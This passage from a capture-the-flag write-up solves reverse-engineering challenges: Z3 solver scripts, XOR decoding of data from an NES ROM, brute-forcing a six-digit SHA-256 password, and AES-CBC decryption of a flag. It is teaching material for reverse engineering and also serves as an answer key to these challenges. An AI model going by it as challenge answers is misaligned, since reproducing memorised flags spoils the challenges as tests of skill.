</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;T&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;T&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;U&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;{&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">35</span><span class="p">]</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="n">model</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">36</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Solution for array a:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Decoded string:&#34;</span><span class="p">,</span> <span class="n">result_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No solution found.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Solution for array a: [73, 83, 73, 84, 68, 84, 85, 123, 97, 95, 103, 48, 108, 100, 101, 110, 95, 99, 97, 116, 95, 49, 110, 95, 121, 48, 117, 114, 95, 97, 114, 101, 97, 33, 33, 125]      </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decoded string: ISITDTU{a_g0lden_cat_1n_y0ur_area!!}</span>
</span></span></code></pre></div><p><code>ISITDTU{a_g0lden_cat_1n_y0ur_area!!}</code></p>
<h3 id="re02">
<a class="header-anchor" href="#re02"></a>
re02
</h3><p><img src="https://hackmd.io/_uploads/HkaixoolJx.png" alt="image"></p>
<p>I recognized this as a challenge involving a NES (Nintendo) file, so I referred to several write-ups, particularly from Flare-On 2019 (challenge 6), which seemed quite similar but unfortunately doesn’t seem to provide much help for me in this case.</p>
<p>In a challenging moment, we discovered an extension for the Ghidra tool at <a href="https://www.retroreversing.com/nes-ghidra">https://www.retroreversing.com/nes-ghidra</a></p>
<p><img src="https://hackmd.io/_uploads/H138Gsol1x.png" alt="image"></p>
<p>we can see that the following conditions are simple equations, which we can solve using Z3 to find the values for <code>IDAT_XXX</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">z3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DAT_0300</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0300&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0301</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0301&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0302</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0302&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0303</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0303&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0304</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0304&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0305</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0305&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0306</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0306&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0307</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0307&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0308</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0308&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_0309</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_0309&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030a</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030a&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030b</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030b&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030c</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030c&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030d</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030d&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030e</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030e&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">DAT_030f</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">BitVec</span><span class="p">(</span><span class="s1">&#39;DAT_030f&#39;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solver</span> <span class="o">=</span> <span class="n">z3</span><span class="o">.</span><span class="n">Solver</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0300</span> <span class="o">+</span> <span class="n">DAT_0301</span> <span class="o">+</span> <span class="n">DAT_0302</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;J&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0301</span> <span class="o">+</span> <span class="n">DAT_0302</span> <span class="o">+</span> <span class="n">DAT_0303</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0302</span> <span class="o">+</span> <span class="n">DAT_0303</span> <span class="o">+</span> <span class="n">DAT_0304</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0303</span> <span class="o">+</span> <span class="n">DAT_0304</span> <span class="o">+</span> <span class="n">DAT_0305</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0304</span> <span class="o">+</span> <span class="n">DAT_0305</span> <span class="o">+</span> <span class="n">DAT_0306</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0305</span> <span class="o">+</span> <span class="n">DAT_0306</span> <span class="o">+</span> <span class="n">DAT_0307</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0306</span> <span class="o">+</span> <span class="n">DAT_0307</span> <span class="o">+</span> <span class="n">DAT_0308</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0307</span> <span class="o">+</span> <span class="n">DAT_0308</span> <span class="o">+</span> <span class="n">DAT_0309</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0308</span> <span class="o">+</span> <span class="n">DAT_0309</span> <span class="o">+</span> <span class="n">DAT_030a</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_0309</span> <span class="o">+</span> <span class="n">DAT_030a</span> <span class="o">+</span> <span class="n">DAT_030b</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_030a</span> <span class="o">+</span> <span class="n">DAT_030b</span> <span class="o">+</span> <span class="n">DAT_030c</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;J&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_030b</span> <span class="o">+</span> <span class="n">DAT_030c</span> <span class="o">+</span> <span class="n">DAT_030d</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;Q&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_030c</span> <span class="o">+</span> <span class="n">DAT_030d</span> <span class="o">+</span> <span class="n">DAT_030e</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;J&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">DAT_030d</span> <span class="o">+</span> <span class="n">DAT_030e</span> <span class="o">+</span> <span class="n">DAT_030f</span> <span class="o">==</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">var</span> <span class="ow">in</span> <span class="p">[</span><span class="n">DAT_0300</span><span class="p">,</span> <span class="n">DAT_0301</span><span class="p">,</span> <span class="n">DAT_0302</span><span class="p">,</span> <span class="n">DAT_0303</span><span class="p">,</span> <span class="n">DAT_0304</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="n">DAT_0305</span><span class="p">,</span> <span class="n">DAT_0306</span><span class="p">,</span> <span class="n">DAT_0307</span><span class="p">,</span> <span class="n">DAT_0308</span><span class="p">,</span> <span class="n">DAT_0309</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">            <span class="n">DAT_030a</span><span class="p">,</span> <span class="n">DAT_030b</span><span class="p">,</span> <span class="n">DAT_030c</span><span class="p">,</span> <span class="n">DAT_030d</span><span class="p">,</span> <span class="n">DAT_030e</span><span class="p">,</span> <span class="n">DAT_030f</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">var</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">var</span> <span class="o">&lt;=</span> <span class="mi">255</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">z3</span><span class="o">.</span><span class="n">sat</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="n">model</span><span class="p">[</span><span class="n">var</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">var</span> <span class="ow">in</span> <span class="p">[</span><span class="n">DAT_0300</span><span class="p">,</span> <span class="n">DAT_0301</span><span class="p">,</span> <span class="n">DAT_0302</span><span class="p">,</span> <span class="n">DAT_0303</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                                                <span class="n">DAT_0304</span><span class="p">,</span> <span class="n">DAT_0305</span><span class="p">,</span> <span class="n">DAT_0306</span><span class="p">,</span> <span class="n">DAT_0307</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                                                <span class="n">DAT_0308</span><span class="p">,</span> <span class="n">DAT_0309</span><span class="p">,</span> <span class="n">DAT_030a</span><span class="p">,</span> <span class="n">DAT_030b</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                                                <span class="n">DAT_030c</span><span class="p">,</span> <span class="n">DAT_030d</span><span class="p">,</span> <span class="n">DAT_030e</span><span class="p">,</span> <span class="n">DAT_030f</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Values for DAT_030x:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="k">for</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No solution found.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>In the result of this Z3 solver, we can choose <code>tuanlinhlinhtuan</code> because it has meaning.</p>
<p><img src="https://hackmd.io/_uploads/HJ8L7jsxkl.png" alt="image"></p>
<p>Can see some char: <code>ISITDTU{</code>, <code>LAB_PPUDATA_8567</code> like as <code>printf</code></p>
<p>We can observe a loop that iterates 43 times, processing each character of the data set with the DAT value we just found as <code>tuanlinhlinhtuan</code>.</p>
<p>The pointer to the data was named <code>DAT_0310</code> in Ghidra so I checked the memory viewer in <code>Mesen</code> at address <code>0310</code> and found this:</p>
<p><img src="https://hackmd.io/_uploads/rkl5Qjiekg.png" alt="image"></p>
<p><strong>Solve Script</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">hex_data</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x2A</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x47</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">xor_key</span> <span class="o">=</span> <span class="s2">&#34;tuanlinhlinhtuan&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">hex_data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">xor_value</span> <span class="o">=</span> <span class="n">hex_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">xor_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">xor_key</span><span class="p">)])</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">xor_value</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Result after XOR:&#34;</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Result after XOR: Throw_back_the_nested_if_NES_have_funnnn_:)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ISITDTU{Throw_back_the_nested_if_NES_have_funnnn_:)}
</span></span></code></pre></div><h3 id="the-chamber-of-flag">
<a class="header-anchor" href="#the-chamber-of-flag"></a>
The Chamber of Flag
</h3><p><img src="https://hackmd.io/_uploads/r19kl2olkl.png" alt="image">
The first thing we have to bypass is the first check pass after we chooses <code>Login</code> option</p>
<p><img src="https://hackmd.io/_uploads/r1TjQtRxke.png" alt="image"></p>
<p>We found the code at here, it use sha256 algorithm to encrypt the password</p>
<p><img src="https://hackmd.io/_uploads/Bkc0EtAxJl.png" alt="image"></p>
<p>Here is the data that our input was compared to after being encrypted:</p>
<p><img src="https://hackmd.io/_uploads/S1GXZpyWkl.png" alt="image"></p>
<p>Out input has just 6 characters which are digits so my teammate wrote a script to bruteforce and then we got a password: <code>808017</code></p>
<p>brute_force.py:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">target_hash</span> <span class="o">=</span> <span class="s2">&#34;26F2D45844BFDBC8E5A2AE67149AA6C50E897A2A48FBF479D1BFB9F0D4E24544&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">charset</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">candidate_str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">candidate_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">candidate_str</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">candidate_hash</span> <span class="o">==</span> <span class="n">target_hash</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Found matching string:&#34;</span><span class="p">,</span> <span class="n">candidate_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No match found.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>In the next step, i try 5 options but only the option <code>flag</code> looks explorable, and finally i found the piece of code</p>
<p><img src="https://hackmd.io/_uploads/HkIQ8KCgkg.png" alt="image"></p>
<p>After patching and debugging, I found that the <code>decrypt_flag</code> function is used to decrypt some data using <code>AES CBC mode</code> with <code>key</code> and <code>iv</code> passed in argument. Here is the <code>key</code> and <code>iv</code>:
<img src="https://hackmd.io/_uploads/HJzLQo1-kx.png" alt="image">
<img src="https://hackmd.io/_uploads/BktOmjJbJg.png" alt="image"></p>
<p>But somehow the buffer of the flag isn&rsquo;t true, and we decide to look for it in the whole program, and when i look in the buffer <code>szNiceCatchFlag</code>, i found some bytes that may work, and they have 0xCAFE each 16 bytes, so i decide to combine 16 bytes into the full buffer 64 bytes</p>
<p><img src="https://hackmd.io/_uploads/rJfBwtCxke.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Crypto.Cipher import AES
</span></span><span class="line"><span class="cl">from binascii import unhexlify
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">key_hex = &#34;26F2D45844BFDBC8E5A2AE67149AA6C50E897A2A48FBF479D1BFB9F0D4E24544&#34;
</span></span><span class="line"><span class="cl">iv_hex = &#34;FF07ECD94D4435DB29DA952F2FC753C4&#34;
</span></span><span class="line"><span class="cl">ciphertext = [162, 175, 250, 94, 179, 80, 150, 111, 168, 185, 13, 43, 110, 149, 211, 85, 
</span></span><span class="line"><span class="cl">              5, 201, 8, 139, 144, 81, 167, 197, 206, 129, 184, 128, 148, 144, 155, 34, 
</span></span><span class="line"><span class="cl">              176, 70, 176, 126, 50, 165, 109, 161, 123, 174, 99, 29, 232, 51, 198, 239, 
</span></span><span class="line"><span class="cl">              207, 205, 23, 57, 50, 9, 213, 10, 17, 221, 246, 30, 111, 48, 166, 3]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
